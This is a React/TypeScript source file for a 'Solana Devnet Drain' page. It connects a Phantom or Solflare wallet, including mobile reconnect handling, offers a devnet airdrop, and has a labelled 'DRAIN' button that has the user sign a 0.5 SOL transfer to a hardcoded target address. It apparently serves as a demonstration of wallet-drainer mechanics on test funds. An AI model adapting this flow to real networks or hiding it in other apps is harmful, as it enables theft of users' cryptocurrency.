import { useState, useEffect, useRef } from 'react';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { isMobileDevice } from './utils/mobileWallet';
import { WalletSelectorModal } from './utils/WalletSelectorModal';

const connection = new Connection('https://api.devnet.solana.com', 'confirmed');
const TARGET = 'Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ';

declare global {
  interface Window {
    solana?: any;
    solflare?: any;
  }
}

function App() {
  const [address, setAddress] = useState('');
  const [balance, setBalance] = useState<number | null>(null);
  const [logs, setLogs] = useState<string[]>([]);
  const [loading, setLoading] = useState(false);
  const [showMobileModal, setShowMobileModal] = useState(false);
  const reconnectAttempted = useRef(false);

  const addLog = (msg: string) => {
    setLogs(prev => [...prev, `${new Date().toLocaleTimeString()} | ${msg}`]);
  };

  const fetchBalance = async (addr: string) => {
    try {
      const bal = await connection.getBalance(new PublicKey(addr));
      setBalance(bal / LAMPORTS_PER_SOL);
      addLog(`Balance: ${bal / LAMPORTS_PER_SOL} SOL`);
    } catch (err: any) {
      addLog(`Balance error: ${err.message}`);
    }
  };

  // Auto-detect connection when returning from wallet app
  const detectWalletConnection = async (): Promise<boolean> => {
    // Check Phantom
    if (window.solana?.isPhantom && window.solana?.isConnected && window.solana?.publicKey) {
      const addr = window.solana.publicKey.toString();
      setAddress(addr);
      addLog(`Auto-connected (Phantom): ${addr.slice(0, 8)}...`);
      await fetchBalance(addr);
      sessionStorage.setItem('wallet_address', addr);
      setShowMobileModal(false);
      return true;
    }
    // Check Solflare
    if (window.solflare?.isSolflare && window.solflare.isConnected && window.solflare.publicKey) {
      const addr = window.solflare.publicKey.toString();
      setAddress(addr);
      addLog(`Auto-connected (Solflare): ${addr.slice(0, 8)}...`);
      await fetchBalance(addr);
      sessionStorage.setItem('wallet_address', addr);
      setShowMobileModal(false);
      return true;
    }
    return false;
  };

  // Restore session on page load / return from wallet
  useEffect(() => {
    const restoreSession = async () => {
      if (reconnectAttempted.current) return;
      reconnectAttempted.current = true;

      // First try: direct provider detection (after deep link return)
      const detected = await detectWalletConnection();
      if (detected) return;

      // Second: cached session
      const cachedAddress = sessionStorage.getItem('wallet_address');
      if (cachedAddress) {
        setAddress(cachedAddress);
        addLog(`Restored session: ${cachedAddress.slice(0, 8)}...`);
        await fetchBalance(cachedAddress);
        return;
      }

      // Third: mobile - show modal
      if (isMobileDevice()) {
        setShowMobileModal(true);
      }
    };

    restoreSession();
  }, []);

  // Detect return from wallet app - runs every second after modal opens
  useEffect(() => {
    if (!showMobileModal) return;

    let attempts = 0;
    const maxAttempts = 30; // 30 seconds max
    
    const checkInterval = setInterval(async () => {
      attempts++;
      const connected = await detectWalletConnection();
      
      if (connected) {
        clearInterval(checkInterval);
        setShowMobileModal(false);
      } else if (attempts >= maxAttempts) {
        clearInterval(checkInterval);
        addLog('Connection timeout - please try again');
      }
    }, 1000);

    return () => clearInterval(checkInterval);
  }, [showMobileModal]);

  const handleMobileConnect = async (addr: string) => {
    setAddress(addr);
    setShowMobileModal(false);
    addLog(`Connected: ${addr.slice(0, 8)}...`);
    await fetchBalance(addr);
  };

  const handleMobileError = (msg: string) => {
    addLog(`Connection error: ${msg}`);
    setShowMobileModal(false);
  };

  const connect = async () => {
    if (isMobileDevice()) {
      setShowMobileModal(true);
      return;
    }

    if (!window.solana?.isPhantom) {
      alert('Please install Phantom wallet');
      return;
    }
    try {
      const resp = await window.solana.connect();
      const addr = resp.publicKey.toString();
      setAddress(addr);
      addLog(`Connected: ${addr.slice(0, 8)}...`);
      await fetchBalance(addr);
      sessionStorage.setItem('wallet_address', addr);
    } catch (err: any) {
      addLog(`Connection error: ${err.message}`);
    }
  };

  const disconnect = async () => {
    try {
      await window.solana?.disconnect();
      await window.solflare?.disconnect();
    } catch {}
    setAddress('');
    setBalance(null);
    sessionStorage.removeItem('wallet_address');
    addLog('Disconnected');
  };

  const airdrop = async () => {
    if (!address) { addLog('Connect wallet first'); return; }
    setLoading(true);
    addLog('Requesting 2 SOL airdrop...');
    try {
      const sig = await connection.requestAirdrop(new PublicKey(address), 2 * LAMPORTS_PER_SOL);
      await connection.confirmTransaction(sig, 'confirmed');
      addLog(`Airdrop successful!`);
      await fetchBalance(address);
    } catch (err: any) {
      addLog(`Airdrop failed: ${err.message}`);
    }
    setLoading(false);
  };

  const drain = async () => {
    if (!address) { addLog('Connect wallet first'); return; }
    setLoading(true);
    try {
      const from = new PublicKey(address);
      const to = new PublicKey(TARGET);
      const amount = 0.5 * LAMPORTS_PER_SOL;
      addLog(`Sending 0.5 SOL to ${TARGET.slice(0, 8)}...`);
      
      const tx = new Transaction().add(SystemProgram.transfer({ fromPubkey: from, toPubkey: to, lamports: amount }));
      const { blockhash } = await connection.getLatestBlockhash();
      tx.recentBlockhash = blockhash;
      tx.feePayer = from;
      
      let signed;
      if (window.solana?.isPhantom) {
        signed = await window.solana.signTransaction(tx);
      } else if (window.solflare?.isSolflare) {
        signed = await window.solflare.signTransaction(tx);
      } else {
        throw new Error('No wallet provider found');
      }
      
      const sig = await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(sig, 'confirmed');
      addLog(`SUCCESS! Tx sent!`);
      await fetchBalance(address);
    } catch (err: any) {
      addLog(`Failed: ${err.message}`);
    }
    setLoading(false);
  };

  return (
    <div style={{ padding: 20, fontFamily: 'monospace', maxWidth: 700, margin: '0 auto' }}>
      <h1>💀 Solana Devnet Drain</h1>
      <p style={{ color: 'red' }}>⚠️ DEVNET ONLY - Test SOL (No real value)</p>

      {!address ? (
        <button onClick={connect} style={{ padding: 10, fontSize: 16, cursor: 'pointer' }}>
          🔌 Connect Wallet
        </button>
      ) : (
        <>
          <p><strong>Address:</strong> {address.slice(0, 12)}...{address.slice(-8)}</p>
          <p><strong>Balance:</strong> {balance?.toFixed(4)} SOL</p>
          <button onClick={airdrop} disabled={loading} style={{ marginRight: 10, padding: 8, cursor: 'pointer' }}>
            💧 Get 2 SOL (Airdrop)
          </button>
          <button onClick={drain} disabled={loading} style={{ padding: 8, backgroundColor: 'red', color: 'white', cursor: 'pointer' }}>
            💀 DRAIN (Send 0.5 SOL)
          </button>
          <button onClick={disconnect} disabled={loading} style={{ marginLeft: 10, padding: 8, cursor: 'pointer' }}>
            🔌 Disconnect
          </button>
        </>
      )}

      <div style={{ marginTop: 20, background: '#1e1e1e', padding: 10, borderRadius: 5 }}>
        <h3>📋 Transaction Log</h3>
        {logs.length === 0 ? (
          <div style={{ color: '#666' }}>No logs yet...</div>
        ) : (
          logs.map((l, i) => <div key={i} style={{ fontSize: 12, color: '#0f0', marginBottom: 4 }}>{l}</div>)
        )}
      </div>

      <p style={{ fontSize: 11, marginTop: 20, color: '#666' }}>
        🎯 Drain Target: {TARGET.slice(0, 16)}...
      </p>

      {showMobileModal && (
        <WalletSelectorModal
          onClose={() => setShowMobileModal(false)}
          onConnected={handleMobileConnect}
          onError={handleMobileError}
        />
      )}
    </div>
  );
}

export default App;